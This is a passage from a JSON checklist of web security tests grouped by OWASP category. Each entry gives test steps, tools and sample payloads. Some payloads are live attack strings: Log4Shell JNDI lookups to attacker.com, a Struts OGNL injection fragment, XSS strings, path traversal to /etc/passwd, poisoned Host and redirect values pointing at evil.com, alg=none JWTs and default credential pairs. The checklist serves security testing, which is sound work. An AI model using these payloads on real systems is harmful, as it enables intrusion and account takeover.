      "tools": "Burp Suite, Fuzzers",
      "critical": true
    },
    {
      "id": "DESIGN-005",
      "name": "Improper Error Handling Design",
      "page": "Error pages, exception handlers",
      "description": "Test if error handling reveals sensitive information or fails securely.",
      "howToTest": "Trigger errors and analyze responses for info leaks.",
      "payloads": ["Invalid inputs to cause exceptions", "Null values in required fields"],
      "tools": "Manual testing, Error scanners",
      "critical": false
    },
    {
      "id": "DESIGN-006",
      "name": "Insecure Caching Mechanisms",
      "page": "Pages with sensitive data, API responses",
      "description": "Test if sensitive data is improperly cached, leading to unauthorized access.",
      "howToTest": "Check cache headers and test if private data is cached publicly.",
      "payloads": ["Cache-Control: no-store bypass tests", "Pragma: no-cache manipulation"],
      "tools": "Browser tools, Cache analyzers",
      "critical": true
    },
    {
      "id": "DESIGN-007",
      "name": "Missing Rate Limiting Design",
      "page": "API endpoints, login forms",
      "description": "Test absence of rate limiting allowing brute force or DoS.",
      "howToTest": "Send rapid requests and monitor for restrictions.",
      "payloads": ["High-volume API calls", "Brute force login attempts"],
      "tools": "Burp Intruder, Custom scripts",
      "critical": true
    },
    {
      "id": "DESIGN-008",
      "name": "Insecure Session Management Design",
      "page": "Authentication systems",
      "description": "Test if session design allows fixation or insufficient randomness.",
      "howToTest": "Analyze session token generation and regeneration.",
      "payloads": ["Fixed session IDs", "Predictable tokens"],
      "tools": "Burp Sequencer",
      "critical": true
    },
    {
      "id": "DESIGN-009",
      "name": "Lack of Secure Defaults",
      "page": "Configuration panels, setup processes",
      "description": "Test if secure configurations aren't enforced by default.",
      "howToTest": "Check default settings for security features.",
      "payloads": ["Default enabled debug mode", "Insecure default ports"],
      "tools": "Configuration scanners",
      "critical": false
    },
    {
      "id": "DESIGN-010",
      "name": "Improper Data Validation Flows",
      "page": "Multi-stage input processing",
      "description": "Test if validation is inconsistently applied across layers.",
      "howToTest": "Bypass client-side validation and test server-side.",
      "payloads": ["Invalid data after client validation removal"],
      "tools": "Burp Suite, Proxy tools",
      "critical": true
    },
    {
      "id": "DESIGN-011",
      "name": "Missing Anti-Automation Controls",
      "page": "Forms vulnerable to bots",
      "description": "Test absence of CAPTCHA or similar for automated attacks.",
      "howToTest": "Automate submissions and check for prevention.",
      "payloads": ["Automated form submissions"],
      "tools": "Selenium, Bot simulation",
      "critical": false
    },
    {
      "id": "DESIGN-012",
      "name": "Insecure Cryptographic Design",
      "page": "Encryption implementations",
      "description": "Test for weak crypto choices in design.",
      "howToTest": "Review crypto algorithms and key management.",
      "payloads": ["Weak algorithms: MD5, RC4"],
      "tools": "Crypto analyzers",
      "critical": true
    },
    {
      "id": "DESIGN-013",
      "name": "Lack of Security Headers",
      "page": "All web pages",
      "description": "Test missing security headers like CSP, HSTS.",
      "howToTest": "Inspect response headers for absences.",
      "payloads": ["Missing Content-Security-Policy"],
      "tools": "Browser DevTools",
      "critical": false
    },
    {
      "id": "DESIGN-014",
      "name": "Insecure Direct Object References in Design",
      "page": "Object access patterns",
      "description": "Test if design exposes direct references without protection.",
      "howToTest": "Attempt reference manipulation.",
      "payloads": ["ID=1 to ID=2"],
      "tools": "Manual testing",
      "critical": true
    },
    {
      "id": "DESIGN-015",
      "name": "Missing Logging of Security Events",
      "page": "All critical operations",
      "description": "Test if design omits logging for security incidents.",
      "howToTest": "Perform actions and check logs.",
      "payloads": ["Unlogged failed logins"],
      "tools": "Log analyzers",
      "critical": false
    },
    {
      "id": "DESIGN-016",
      "name": "Insecure Workflow Design",
      "page": "Business processes",
      "description": "Test if workflows can be bypassed in design.",
      "howToTest": "Skip steps in processes.",
      "payloads": ["Direct final step access"],
      "tools": "Manual testing",
      "critical": true
    },
    {
      "id": "DESIGN-017",
      "name": "Lack of Input Sanitization Layers",
      "page": "Input processing chains",
      "description": "Test missing multi-layer sanitization.",
      "howToTest": "Inject at different points.",
      "payloads": ["Unsanitized inputs"],
      "tools": "Fuzzers",
      "critical": true
    },
    {
      "id": "DESIGN-018",
      "name": "Insecure Third-Party Integration Design",
      "page": "API integrations",
      "description": "Test poor integration security design.",
      "howToTest": "Review integration points.",
      "payloads": ["Unverified callbacks"],
      "tools": "Manual review",
      "critical": false
    },
    {
      "id": "DESIGN-019",
      "name": "Missing Threat Modeling in Design",
      "page": "Overall application architecture",
      "description": "Assess if design lacks threat modeling considerations.",
      "howToTest": "Review design docs for security considerations.",
      "payloads": ["N/A - Design review"],
      "tools": "Threat modeling tools",
      "critical": false
    },
    {
      "id": "DESIGN-020",
      "name": "Insecure Data Storage Design",
      "page": "Database and storage systems",
      "description": "Test if storage design fails to protect sensitive data.",
      "howToTest": "Check encryption and access controls in storage.",
      "payloads": ["Unencrypted sensitive data"],
      "tools": "Database scanners",
      "critical": true
    }
  ],
  "OWASP A05 - Security Misconfiguration": [
    {
      "id": "MISC-001",
      "name": "Default Credentials",
      "page": "Administrative interfaces, databases, network devices",
      "description": "Check if default usernames and passwords were never changed after installation.",
      "howToTest": "Attempt login with vendor-supplied defaults or widely known username/password combos.",
      "payloads": ["admin:admin", "root:root", "administrator:password", "sa:sa", "tomcat:tomcat"],
      "tools": "Hydra, Ncrack, Burp Suite Intruder",
      "critical": true
    },
    {
      "id": "MISC-002",
      "name": "Directory Listing Enabled",
      "page": "Web-server directories (uploads/, backup/, tmp/)",
      "description": "Verify if web servers expose directory indexes that reveal file names and paths.",
      "howToTest": "Browse to common folders without a trailing filename; look for automatically generated file listings.",
      "payloads": ["/", "/uploads/", "/backup/", "/WEB-INF/", "/.git/"],
      "tools": "DirBuster, ffuf, Browser",
      "critical": false
    },
    {
      "id": "MISC-003",
      "name": "Verbose Error Messages",
      "page": "Error pages, exception handlers, stack traces",
      "description": "Determine if detailed errors leak stack traces, paths, or configuration details.",
      "howToTest": "Trigger invalid inputs and watch responses for debug data or stack traces.",
      "payloads": ["'\"<>&", "%00", "../../", "{{7*7}}"],
      "tools": "Burp Suite, Manual fuzzing",
      "critical": false
    },

    /* ---------- NEW TESTS (MISC-004 ➜ MISC-020) ---------- */
    {
      "id": "MISC-004",
      "name": "Unpatched / Out-of-Date Software",
      "page": "Web servers, frameworks, OS packages, libraries",
      "description": "Identify software running with known vulnerabilities due to missing patches.",
      "howToTest": "Enumerate versions via headers, banners, or file metadata; compare with CVE feeds.",
      "payloads": ["GET /server-status", "HEAD /", "curl -I site.com"],
      "tools": "Nmap, Nikto, Nessus, Snyk CLI",
      "critical": true
    },
    {
      "id": "MISC-005",
      "name": "Server Version Disclosure",
      "page": "HTTP headers, error pages, login banners",
      "description": "Check if exact versions of servers/frameworks are exposed to users.",
      "howToTest": "Inspect HTTP response headers and error pages for “Server”, “X-Powered-By”, or banner text.",
      "payloads": ["curl -I", "nc host 80", "GET /nonexistent"],
      "tools": "curl, Burp Suite, Nmap banner-grab",
      "critical": false
    },
    {
      "id": "MISC-006",
      "name": "Sample / Debug Pages Present",
      "page": "Default app samples (e.g., /examples/, /phpinfo.php)",
      "description": "Find shipped demo pages or debug endpoints left enabled in production.",
      "howToTest": "Crawl for well-known sample paths and debug scripts; access them directly.",
      "payloads": ["/examples/", "/phpinfo.php", "/server-info", "/console", "/actuator"],
      "tools": "Dirsearch, ffuf, Browser",
      "critical": false
    },
    {
      "id": "MISC-007",
      "name": "Unnecessary Services / Ports Enabled",
      "page": "Server OS, container images, cloud instances",
      "description": "Identify services that are running but not required, increasing attack surface.",
      "howToTest": "Perform full TCP/UDP port scan; map services to business need.",
      "payloads": ["nmap -p- host", "nmap -sU host"],
      "tools": "Nmap, Masscan",
      "critical": true
    },
    {
      "id": "MISC-008",
      "name": "Missing Security Headers",
      "page": "All HTTP responses",
      "description": "Verify absence or weak configuration of headers like CSP, HSTS, X-Frame-Options, X-Content-Type-Options.",
      "howToTest": "Inspect responses for required headers and secure directives.",
      "payloads": ["curl -I https://site", "Burp Header viewer"],
      "tools": "Burp Suite, Mozilla Observatory, securityheaders.com",
      "critical": false
    },
    {
      "id": "MISC-009",
      "name": "CORS Allow-All with Credentials",
      "page": "API endpoints, AJAX resources",
      "description": "Check if Access-Control-Allow-Origin reflects arbitrary origins while Access-Control-Allow-Credentials is true.",
      "howToTest": "Send requests with malicious Origin and observe if response includes it with ACA-Credentials:true.",
      "payloads": ["Origin: https://evil.com", "Origin: null"],
      "tools": "Burp Suite, curl",
      "critical": true
    },
    {
      "id": "MISC-010",
      "name": "Weak Content-Security-Policy",
      "page": "Pages embedding scripts or third-party content",
      "description": "Determine if CSP is absent, wildcarded, or allows inline scripts, weakening XSS defenses.",
      "howToTest": "Review CSP header for unsafe-inline, unsafe-eval, or * wildcards.",
      "payloads": ["unsafe-inline", "script-src * data: blob:"],
      "tools": "Browser DevTools, CSP Evaluator",
      "critical": true
    },
    {
      "id": "MISC-011",
      "name": "Self-Signed or Expired TLS Certificates",
      "page": "HTTPS endpoints",
      "description": "Validate certificate chain, expiration, and hostname matching.",
      "howToTest": "Use TLS scanners; attempt MITM with self-signed cert and observe acceptance.",
      "payloads": ["openssl s_client -connect host:443", "mitmproxy injection"],
      "tools": "testssl.sh, SSLyze, Browser lock icon",
      "critical": true
    },
    {
      "id": "MISC-012",
      "name": "Insecure File Permissions",
      "page": "Log directories, configuration files, deployment folders",
      "description": "Check for world-readable or world-writable sensitive files on server.",
      "howToTest": "Attempt to read config/log files via LFI or direct URL; audit filesystem permissions if possible.",
      "payloads": ["/logs/app.log", "/config/.env", "../../etc/passwd"],
      "tools": "LFI payload lists, SSH shell, LinPEAS",
      "critical": true
    },
    {
      "id": "MISC-013",
      "name": "Public Cloud Storage Buckets",
      "page": "AWS S3, Azure Blob, GCP Cloud Storage",
      "description": "Discover publicly readable or writable storage exposing sensitive objects.",
      "howToTest": "Enumerate bucket names and test ACLs or presigned URLs.",
      "payloads": ["https://bucket.s3.amazonaws.com/", "aws s3 ls s3://bucket --no-sign-request"],
      "tools": "AWS CLI, GCP gsutil, cloudsplaining",
      "critical": true
    },
    {
      "id": "MISC-014",
      "name": "Privileged or Insecure Container Settings",
      "page": "Docker / Kubernetes workloads",
      "description": "Find containers running as root, with --privileged flag, or mounting host paths unsafely.",
      "howToTest": "Inspect Kubernetes manifests or docker inspect output for risky options.",
      "payloads": ["securityContext: privileged: true", "docker run --privileged", "hostPath mounts"],
      "tools": "kube-audit, Dockle, Kubescape",
      "critical": true
    },
    {
      "id": "MISC-015",
      "name": "Backup & Temp Files Accessible",
      "page": "Web roots and static directories",
      "description": "Verify if .bak, .old, or ~ files expose source code or credentials.",
      "howToTest": "Append common backup extensions to known URLs and attempt direct access.",
      "payloads": ["/index.php~", "/config.php.bak", "/admin.old", "/.env.save"],
      "tools": "Dirsearch, ffuf, Burp Suite",
      "critical": false
    },
    {
      "id": "MISC-016",
      "name": "Version-Control Repositories Exposed",
      "page": "Public web root (.git/, .hg/, .svn/)",
      "description": "Check if VCS metadata is accessible and leaks full source code.",
      "howToTest": "Attempt to download /.git/HEAD or /.svn/entries and reconstruct repo.",
      "payloads": ["/.git/HEAD", "/.svn/entries", "/.hg/00changelog.i"],
      "tools": "GitTools Dumper, BFG Repo-Cleaner",
      "critical": false
    },
    {
      "id": "MISC-017",
      "name": "Debug / Verbose Mode Enabled in Production",
      "page": "Framework configuration (Django DEBUG, Rails full error)",
      "description": "Identify debug settings that expose stack traces, secret keys, or interactive consoles.",
      "howToTest": "Trigger errors or check response headers for debug banners.",
      "payloads": ["/nonexistent", "{{7*7}}", "/__debug__/"],
      "tools": "Browser, Burp, Framework-specific scanners",
      "critical": true
    },
    {
      "id": "MISC-018",
      "name": "Dangerous HTTP Methods Allowed",
      "page": "Web and API servers",
      "description": "Test if PUT, DELETE, TRACE, or WEBDAV methods are enabled and unauthenticated.",
      "howToTest": "Send OPTIONS request or direct PUT/DELETE calls; check status codes.",
      "payloads": ["OPTIONS /", "PUT /shell.jsp", "DELETE /index.html", "TRACE / HTTP/1.1"],
      "tools": "curl, Nmap http-methods script, Burp Suite",
      "critical": true
    },
    {
      "id": "MISC-019",
      "name": "Over-Permissive Firewall / ACL Rules",
      "page": "Network firewalls, security groups, load balancers",
      "description": "Locate rules that allow 0.0.0.0/0 or overly broad CIDR ranges to sensitive ports.",
      "howToTest": "Review firewall configs or perform external port scans to confirm exposure.",
      "payloads": ["nmap -p22,3306 host", "AWS SG with 0.0.0.0/0:22"],
      "tools": "Nmap, CloudSploit, ScoutSuite",
      "critical": true
    },
    {
      "id": "MISC-020",
      "name": "Hidden Backup Endpoints (.old/.bak APIs)",
      "page": "Deprecated API routes kept for legacy reasons",
      "description": "Test if old endpoints still exist with weaker auth or none at all.",
      "howToTest": "Probe for /v1.old/, /api.bak/, or renamed routes and attempt sensitive actions.",
      "payloads": ["/api/v1.bak/login", "/admin_old/", "/rest.bak/"],
      "tools": "Dirbuster, Burp Suite",
      "critical": false
    }
  ],
  "OWASP A06 - Vulnerable Components": [
   {
      "id": "VULN-001",
      "name": "Outdated Core Framework / Library",
      "page": "Every layer that imports third-party code (backend and frontend)",
      "description": "Detect use of components with published CVEs that are no longer supported or patched.",
      "howToTest": "Build a full SBOM, run SCA tools, and cross-check component versions against NVD or vendor advisories.",
      "payloads": ["log4j-1.2.17.jar (CVE-2019-17571)", "struts-2.3.31.war (CVE-2017-5638)"],
      "tools": "OWASP Dependency-Check, Syft + Grype, Snyk CLI",
      "critical": true
    },
    {
      "id": "VULN-002",
      "name": "Log4Shell-Affected Log4j ≤ 2.14.1",
      "page": "Java services using Apache Log4j",
      "description": "Check for vulnerable Log4j versions susceptible to JNDI RCE (CVE-2021-44228).",
      "howToTest": "Scan JARs; send `${jndi:ldap://<collaborator>}` in any logged request and watch for outbound LDAP.",
      "payloads": ["${jndi:ldap://attacker.com/a}", "${jndi:dns://<uniq>.burpcollaborator.net/a}"],
      "tools": "Dependency-Check, Burp Collaborator, Trivy",
      "critical": true
    },
    {
      "id": "VULN-003",
      "name": "Apache Struts ≤ 2.3.32 / 2.5.10",
      "page": "Java MVC apps running Struts",
      "description": "Older Struts versions allow OGNL injection leading to RCE (CVE-2017-5638).",
      "howToTest": "Identify `/struts2-showcase` or vulnerable JARs; send crafted `Content-Type` header exploiting OGNL.",
      "payloads": ["%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"],
      "tools": "Nmap http-struts2-scan, Burp Suite",
      "critical": true
    },
    {
      "id": "VULN-004",
      "name": "Vulnerable jQuery < 3.6.0",
      "page": "Pages including legacy jQuery (CDN or local)",
      "description": "Old jQuery leaks XSS via `$.html()` / `location.hash` parsing (e.g., CVE-2020-11022).",
      "howToTest": "Inspect `<script>` tags; load PoC URLs containing `<img onerror>` to see if script executes.",
      "payloads": ["#<img/src=x/onerror=alert(1)>", "<svg/onload=alert(document.domain)>"],
      "tools": "Browser DevTools, Retire.js",
      "critical": false
    },
    {
      "id": "VULN-005",
      "name": "Abandoned WordPress Plugins",
      "page": "WordPress admin › Plugins",
      "description": "Plugins without recent updates can harbor publicly-known exploits.",
      "howToTest": "Enumerate plugins with `wp-scan`; cross-reference version vs WPVulnDB.",
      "payloads": ["/wp-content/plugins/vulnerable-plugin/readme.txt"],
      "tools": "WPScan, Nikto",
      "critical": true
    },
    {
      "id": "VULN-006",
      "name": "Unpinned NPM SemVer Ranges",
      "page": "`package.json` dependencies using `^` or `*`",
      "description": "Wildcard ranges may auto-upgrade to malicious or vulnerable versions (supply-chain hijack).",
      "howToTest": "Inspect `package.json` / `package-lock.json`; run `npm audit` and simulate `npm i` on clean env.",
      "payloads": ["\"lodash\": \"^4.17.0\"", "\"event-stream\": \"*\""],
      "tools": "npm audit, Snyk, Socket.dev",
      "critical": true
    },
    {
      "id": "VULN-007",
      "name": "Unsigned Python Wheels",
      "page": "PyPI packages in requirements.txt",
      "description": "Installing packages without signature / hash pinning enables dependency confusion or typosquatting.",
      "howToTest": "Replace internal package with same name on PyPI; attempt `pip install` in CI mirror.",
      "payloads": ["evilcorp-internal-pkg==1.0.0"],
      "tools": "pip-audit, Artifactory Xray",
      "critical": true
    },
    {
      "id": "VULN-008",
      "name": "Transitive Dependency with CVE",
      "page": "Nested libraries pulled by primary dependency",
      "description": "Indirect components may include exploitable code even if direct dependencies are up to date.",
      "howToTest": "Generate dependency tree; flag any node with high-severity CVE.",
      "payloads": ["commons-collections-3.2.1.jar (CVE-2015-7501)"],
      "tools": "OWASP Dependency-Track, Maven `dependency:tree`",
      "critical": true
    },
    {
      "id": "VULN-009",
      "name": "Vulnerable Base Container Image",
      "page": "Dockerfiles / container registries",
      "description": "Base images such as `ubuntu:18.04` may include outdated packages with CVEs.",
      "howToTest": "Scan image layers for CVEs; compare against current LTS versions.",
      "payloads": ["FROM ubuntu:18.04", "FROM node:12"],
      "tools": "Trivy, Grype, Docker Scout",
      "critical": true
    },
    {
      "id": "VULN-010",
      "name": "Unpatched OS Packages in Containers",
      "page": "Running containers",
      "description": "Out-of-date `apt` / `apk` packages introduce known vulnerabilities.",
      "howToTest": "`docker exec` into container; run package manager update and list upgrades.",
      "payloads": ["apt list --upgradable", "apk version -l '<'"],
      "tools": "Trivy, Lynis",
      "critical": false
    },
    {
      "id": "VULN-011",
      "name": "OpenSSL ≤ 1.0.1f (Heartbleed)",
      "page": "SSL/TLS libraries on servers or appliances",
      "description": "Heartbleed (CVE-2014-0160) leaks memory contents over ‘heartbeat’ requests.",
      "howToTest": "Use Heartbleed scanners; send malformed heartbeat and watch for memory dump.",
      "payloads": ["TLS heartbeat request length > payload"],
      "tools": "testssl.sh, nmap --script ssl-heartbleed",
      "critical": true
    },
    {
      "id": "VULN-012",
      "name": "End-of-Life Operating System",
      "page": "Servers, containers, embedded devices",
      "description": "EOL OSes (e.g., Windows Server 2008, CentOS 6) receive no security patches.",
      "howToTest": "Identify OS version via banners or SSH; cross-check vendor support status.",
      "payloads": ["nmap -O host", "ssh user@host"],
      "tools": "Nmap, Nessus, OS query",
      "critical": true
    },
    {
      "id": "VULN-013",
      "name": "Unsigned Maven Artifacts",
      "page": "Java build pipelines",
      "description": "Lack of PGP-signed JARs allows repo poisoning or man-in-the-middle replacement.",
      "howToTest": "Inspect POM files and repo metadata for `.asc` signatures; attempt to publish malicious artifact to controlled repo.",
      "payloads": ["mvn deploy -DartifactId=target-group"],
      "tools": "Sonatype Nexus IQ, GPG, Maven Enforcer",
      "critical": true
    },
    {
      "id": "VULN-014",
      "name": "Vulnerable Browser Extension Bundles",
      "page": "Electron / Cordova apps packaging extensions",
      "description": "Bundling outdated Chromium or insecure extensions exposes RCE/XSS.",
      "howToTest": "Inspect package versions and extension manifests inside ASAR or APK files.",
      "payloads": ["Electron < 9 with nodeIntegration=true"],
      "tools": "Electron-audit, MobSF",
      "critical": false
    },
    {
      "id": "VULN-015",
      "name": "Outdated Database Driver",
      "page": "Application data access layer",
      "description": "Legacy JDBC/ODBC drivers may permit auth-bypass or deserialization exploits.",
      "howToTest": "Enumerate driver JAR versions; review CVE lists; attempt proof-of-concept exploit queries.",
      "payloads": ["mysql-connector-java-5.1.6.jar"],
      "tools": "Dependency-Check, Nessus DB plugins",
      "critical": true
    },
    {
      "id": "VULN-016",
      "name": "Deprecated CMS Core (Drupal, Joomla, etc.)",
      "page": "Public CMS instances",
      "description": "Running unsupported CMS versions exposes critical RCE/XSS flaws.",
      "howToTest": "Check `/CHANGELOG.txt` or meta tags for version; scan with CMS-specific tools.",
      "payloads": ["/user/register?element_parents=account/mail/%23value&value=<script>alert(1)</script>"],
      "tools": "Drupalgeddon PoC, droopescan, wpscan",
      "critical": true
    },
    {
      "id": "VULN-017",
      "name": "Use of Unmaintained GitHub Project",
      "page": "Custom libraries vendored into codebase",
      "description": "Forks with no commits for years may contain unpatched security issues.",
      "howToTest": "Check repository activity; search for open CVEs; attempt to replace with maintained fork.",
      "payloads": ["Abandoned-lib-1.0.0.tgz"],
      "tools": "GitHub Dependency Graph, osv.dev APIs",
      "critical": false
    },
    {
      "id": "VULN-018",
      "name": "Malicious Package Typosquatting",
      "page": "Package managers (npm, PyPI, RubyGems)",
      "description": "Accidental installation of similarly-named package that contains malware.",
      "howToTest": "Scan lock files for unfamiliar packages; publish benign PoC typosquat and watch CI pulls.",
      "payloads": ["expresss (extra s)", "reqeust"],
      "tools": "git-grep, Socket.dev, npm audit",
      "critical": true
    },
    {
      "id": "VULN-019",
      "name": "Insecure Remote Script CDN Inclusion",
      "page": "HTML templates referencing third-party JS",
      "description": "Using HTTP or unpinned hash integrity for remote scripts enables supply-chain compromise.",
      "howToTest": "Search templates for external `<script>` with http:// or without `integrity` attribute.",
      "payloads": ["<script src=\"http://cdn.example.com/jquery.js\"></script>"],
      "tools": "grep, CSP scanners",
      "critical": false
    },
    {
      "id": "VULN-020",
      "name": "Missing Software Bill of Materials (SBOM)",
      "page": "Build pipelines, compliance documentation",
      "description": "Without an SBOM, teams cannot quickly assess exposure when new CVEs emerge.",
      "howToTest": "Ask for SBOM (CycloneDX/SPDX). If unavailable, attempt to generate and compare for gaps.",
      "payloads": ["syft dir:/app -o cyclonedx"],
      "tools": "Syft, Anchore, Dependency-Track",
      "critical": true
    }
  ],
  "OWASP A07 - Authentication Failures": [
   {
      "id": "AUTH-001",
      "name": "Weak Password Policy Enforcement",
      "page": "Registration, password-change and reset forms",
      "description": "Verify if the application accepts short, common or dictionary-based passwords that lack complexity.",
      "howToTest": "Attempt to set trivial passwords and observe server-side validation; submit the request via proxy after stripping client-side checks.",
      "payloads": ["password", "12345678", "qwerty", "letmein", "Pa$$w0rd"],
      "tools": "Burp Suite, wordlists, manual requests",
      "critical": true
    },
    {
      "id": "AUTH-002",
      "name": "User Enumeration via Login Responses",
      "page": "Primary login endpoint, social-login callbacks, 2FA prompts",
      "description": "Determine whether different error messages or timing reveal valid usernames or emails.",
      "howToTest": "Send identical passwords with a list of usernames; measure response bodies or times for discrepancies.",
      "payloads": ["invalidUser1", "validUser", "admin@example.com"],
      "tools": "Burp Intruder, diff tools, time-measurement scripts",
      "critical": true
    },
    {
      "id": "AUTH-003",
      "name": "Credential Stuffing / Password Spraying",
      "page": "Login API, OAuth token endpoint",
      "description": "Assess rate-limiting and lockout controls against large-scale automated login attempts with leaked credentials.",
      "howToTest": "Replay breach combos at low request rates to avoid lockouts; scale up to find threshold.",
      "payloads": ["combo-list.txt (user:pass)", "common-passwords.txt"],
      "tools": "Burp Suite Intruder, Hydra, custom Go/Rust scripts",
      "critical": true
    },
    {
      "id": "AUTH-004",
      "name": "Missing Multi-Factor Authentication (MFA)",
      "page": "Sensitive actions (login, money transfer, password change)",
      "description": "Check whether high-risk operations can be completed with single-factor credentials only.",
      "howToTest": "Attempt actions on accounts that have MFA disabled or partially configured; review account-security settings.",
      "payloads": ["Skip-MFA flow", "Direct POST to /confirm-transfer"],
      "tools": "Browser DevTools, Burp Repeater",
      "critical": true
    },
    {
      "id": "AUTH-005",
      "name": "Brute-Force Protection Bypass",
      "page": "Any login or OTP verification endpoint",
      "description": "Attempt to evade lockouts using multiple IPs, X-Forwarded-For spoofing or GraphQL batching.",
      "howToTest": "Rotate IP headers or use Tor to continue password guesses beyond the lockout threshold.",
      "payloads": ["X-Forwarded-For: 1.1.1.1", "operationName: multiLogin"],
      "tools": "Burp ClusterBomb, Gobuster, proxychains",
      "critical": true
    },
    {
      "id": "AUTH-006",
      "name": "Session Fixation",
      "page": "Login flow that reuses session IDs",
      "description": "Determine if the server fails to regenerate the session token after successful authentication.",
      "howToTest": "Capture pre-login session cookie, authenticate, and verify whether the cookie value remains identical.",
      "payloads": ["JSESSIONID=ABC123", "PHPSESSID=deadbeef"],
      "tools": "Burp Suite, browser cookies panel",
      "critical": true
    },
    {
      "id": "AUTH-007",
      "name": "Password Reset Poisoning",
      "page": "Forgot-password workflow",
      "description": "See whether reset links can be delivered to attacker-controlled domains via Host header or parameter manipulation.",
      "howToTest": "Alter Host/Origin headers or add redirect_uri params; inspect email for poisoned link.",
      "payloads": ["Host: evil.com", "reset_url=https://attacker.com"],
      "tools": "Burp Suite, SMTP interception (MailHog)",
      "critical": true
    },
    {
      "id": "AUTH-008",
      "name": "Insecure Direct Password Reset (No Old Password)",
      "page": "Change-password form inside profile settings",
      "description": "Verify if users can change their password without supplying the current one or MFA verification.",
      "howToTest": "Login as victim on a shared computer, call change-password API with only newPassword field.",
      "payloads": ["{ \"new_password\":\"P@ssw0rd123\" }"],
      "tools": "Burp Repeater, Postman",
      "critical": true
    },
    {
      "id": "AUTH-009",
      "name": "Plain-Text or Weakly Hashed Password Storage",
      "page": "Database dumps, forgotten backups, error logs",
      "description": "Identify passwords stored without strong hashing algorithms (bcrypt, Argon2, scrypt).",
      "howToTest": "Obtain database sample (legally) or review stack traces; inspect hash length/prefix.",
      "payloads": ["$1$", "$2y$", "5f4dcc3b5aa765d61d8327deb882cf99 (MD5)"],
      "tools": "HashID, John the Ripper, Audit scripts",
      "critical": true
    },
    {
      "id": "AUTH-010",
      "name": "Insecure JWT Implementation",
      "page": "API Authorization headers",
      "description": "Test for alg=none bypasses, missing exp, or weak signing keys.",
      "howToTest": "Modify header to {\"alg\":\"none\"} and resign; brute-force HS256 secrets; extend exp claim far in the future.",
      "payloads": ["{\"alg\":\"none\"}.payload.", "{\"alg\":\"HS256\"}.payload.fakeSig"],
      "tools": "jwt_tool, Burp Suite JWT Editor",
      "critical": true
    },
    {
      "id": "AUTH-011",
      "name": "Bypassable Account Lockout",
      "page": "Login, OTP and PIN entry forms",
      "description": "Check if lockout counters are per-IP, per-user or easily reset by cookies, allowing brute force to continue.",
      "howToTest": "Exceed lockout, then clear cookies, change IP or tweak username case to continue attempts.",
      "payloads": ["Admin vs admin", "user@site.com vs USER@SITE.COM"],
      "tools": "Burp Intruder, custom retry scripts",
      "critical": false
    },
    {
      "id": "AUTH-012",
      "name": "Unsafe ‘Remember-Me’ Tokens",
      "page": "Persistent-login cookies",
      "description": "Determine if remember-me cookies are long-lived, predictable, or not bound to IP/UA.",
      "howToTest": "Steal token, replay from different browser/IP, observe successful login.",
      "payloads": ["remember-me=base64(username:password)", "auth_token=abcdef123456"],
      "tools": "Browser dev tools, Burp Repeater",
      "critical": true
    },
    {
      "id": "AUTH-013",
      "name": "OTP / 2FA Bypass via Reuse or Predictable Codes",
      "page": "MFA challenge endpoints",
      "description": "Attempt to reuse old codes, predictable HOTP counter, or brute-force 4-digit SMS codes without lockout.",
      "howToTest": "Submit expired codes, incrementing counters; send many 0000-9999 codes if no rate limit.",
      "payloads": ["000000", "123456", "999999"],
      "tools": "Burp Intruder Turbo, custom scripts",
      "critical": true
    },
    {
      "id": "AUTH-014",
      "name": "OAuth Misconfiguration (open redirect / weak scopes)",
      "page": "Third-party sign-in endpoints",
      "description": "Check if redirect_uri is poorly validated or if scope contains ‘*’ allowing privilege escalation.",
      "howToTest": "Change redirect_uri to attacker-site; request broader scopes like admin privileges.",
      "payloads": ["redirect_uri=https://evil.com/callback", "scope=openid profile admin"],
      "tools": "OAuth2-client scripts, Burp",
      "critical": true
    },
    {
      "id": "AUTH-015",
      "name": "Forgot-Password Email Enumeration",
      "page": "Forgot-password form",
      "description": "Identify if submitting nonexistent addresses reveals ‘user not found’ vs generic success.",
      "howToTest": "Submit random and real emails; compare responses and HTTP status codes.",
      "payloads": ["unknown@example.com", "valid@site.com"],
      "tools": "Burp Intruder, diff, timing scripts",
      "critical": false
    },
    {
      "id": "AUTH-016",
      "name": "Magic-Link Authentication Weakness",
      "page": "Email-only login systems",
      "description": "Determine if magic links are single-use, expire quickly and are bound to IP or User-Agent.",
      "howToTest": "Reuse old link or open from separate device; measure expiration window.",
      "payloads": ["/login/verify?token=abcdef", "share token cross-browser"],
      "tools": "Email catcher, multiple browsers",
      "critical": false
    },
    {
      "id": "AUTH-017",
      "name": "Insecure Captcha Implementation",
      "page": "Login and registration forms",
      "description": "Check if Captcha can be bypassed by parameter replay, predictable answer or disabled with a flag.",
      "howToTest": "Replay previous valid captchaResponse, set captcha=off, or bypass JavaScript-only control.",
      "payloads": ["captcha=0", "g-recaptcha-response=validPrevToken"],
      "tools": "Burp Repeater, Selenium",
      "critical": false
    },
    {
      "id": "AUTH-018",
      "name": "Insecure Logout / Session Expiry",
      "page": "Logout endpoints, idle timeout checks",
      "description": "Verify that session tokens remain valid after explicit logout or inactivity threshold.",
      "howToTest": "Logout, intercept redirected request, resend with old cookies; check if access granted.",
      "payloads": ["Reuse old session ID", "Replay Authorization: Bearer <token>"],
      "tools": "Burp Repeater, browser storage viewers",
      "critical": true
    },
    {
      "id": "AUTH-019",
      "name": "Cross-Site Request Forgery on Login / Logout",
      "page": "Single-sign-on flows, stateful login endpoints",
      "description": "Test if CSRF can silently authenticate victim or log them out, breaking account integrity.",
      "howToTest": "Craft auto-submitting form to /login with victim’s credentials cookie; observe silent login.",
      "payloads": ["<form method=\"POST\" action=\"/logout\"></form>"],
      "tools": "Burp CSRF PoC generator",
      "critical": false
    },
    {
      "id": "AUTH-020",
      "name": "Password Reset Token Predictability",
      "page": "Password-reset email links",
      "description": "Assess whether reset tokens are guessable, incremental or lack sufficient entropy.",
      "howToTest": "Request multiple resets, compare token structure; attempt brute force against token parameter.",
      "payloads": ["token=000000", "token=abcdef", "token=123e4567-e89b-12d3-a456-426614174000"],
      "tools": "Burp Intruder, hash-analysis scripts",
      "critical": true
    }
  ],
  "OWASP A08 - Software and Data Integrity Failures": [
   {
      "id": "INTEGRITY-001",
      "name": "Unsigned Software Updates",
      "page": "Desktop / mobile apps, self-update daemons, plugin installers",
      "description": "Verify that binaries and packages are cryptographically signed and the signature is validated before installation.",
      "howToTest": "Intercept the update request (Burp, MITMproxy) and swap the URL or package with an unsigned build; observe if the client installs it.",
      "payloads": ["Unsigned .exe / .apk", "Tampered .deb with altered hashes"],
